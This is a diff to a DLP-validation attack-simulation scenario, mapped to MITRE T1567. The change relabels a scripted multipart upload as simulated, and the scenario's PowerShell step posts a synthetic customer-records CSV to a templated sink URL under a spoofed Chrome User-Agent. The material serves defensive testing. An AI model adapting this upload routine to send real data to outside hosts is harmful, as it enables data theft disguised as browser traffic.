@@ -9,6 +9,14 @@ description: >
   Chrome User-Agent. Verified by the sink's destination-side receipt, the same
   model as dlp-exfiltration-sink-https.
 
+  simulated_upload: this scenario is a scripted HTTP multipart request. It is NOT a
+  drag-and-drop or any other user gesture, no browser UI is driven, and no file
+  picker is used. "Browser-style" describes the request shape only. Evidence must
+  not be read as showing that a person performed an upload. The sink's channel
+  field carries the value simulated-upload, so receipts and correlation evidence
+  do not label a scripted request as a browser upload. Receipts written before
+  this change keep their original browser-upload value and are not rewritten.
+
   Why a separate scenario from the JSON POST: web DLP and proxy products treat a
   multipart file upload differently from a JSON body, and a browser upload is the
   most common way a person moves a file out. This is a standalone scenario with a
@@ -38,7 +46,7 @@ mitre_phases:
   - exfiltration
 
 steps:
-  - name: "DLP Validation — Browser-Style Multipart Upload (T1567)"
+  - name: "DLP Validation — Simulated Upload, browser-style multipart request (T1567) [simulated_upload]"
     technique_id: T1567
     detection_profiles:
       - windows_dlp_exfiltration
@@ -65,16 +73,16 @@ steps:
         $client.DefaultRequestHeaders.UserAgent.ParseAdd('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36')
         $form = New-Object System.Net.Http.MultipartFormDataContent
         $form.Add((New-Object System.Net.Http.StringContent('{{SINK_TOKEN}}')), 'token')
-        $form.Add((New-Object System.Net.Http.StringContent('browser-upload')), 'channel')
+        $form.Add((New-Object System.Net.Http.StringContent('simulated-upload')), 'channel')
         $file = New-Object System.Net.Http.ByteArrayContent(,[System.Text.Encoding]::UTF8.GetBytes($csvContent))
         $file.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('text/csv')
         $form.Add($file, 'payload', 'customer-records.csv')
         $resp = $client.PostAsync('{{SINK_URL}}', $form).GetAwaiter().GetResult()
         $resp.Dispose()
         $client.Dispose()
-        Write-Output "EXEC T1567: multi-type sensitive record uploaded as a multipart file over HTTPS. [BAS-SIM-DLP-BROWSER-UPLOAD]"
+        Write-Output "EXEC T1567 simulated_upload: scripted multipart request sent the synthetic record over HTTPS. No user gesture or browser interaction occurred. [BAS-SIM-DLP-BROWSER-UPLOAD]"
       } catch {
-        Write-Output "EXEC T1567: multipart upload to sink was blocked or failed before completing. [BAS-SIM-DLP-BROWSER-UPLOAD]"
+        Write-Output "EXEC T1567 simulated_upload: scripted multipart request to the sink was blocked or failed before completing. No user gesture or browser interaction occurred. [BAS-SIM-DLP-BROWSER-UPLOAD]"
       }
       # No local DLP_OBSERVATION marker here -- the verdict comes entirely from
       # whether the sink endpoint received the token, resolved server-side by
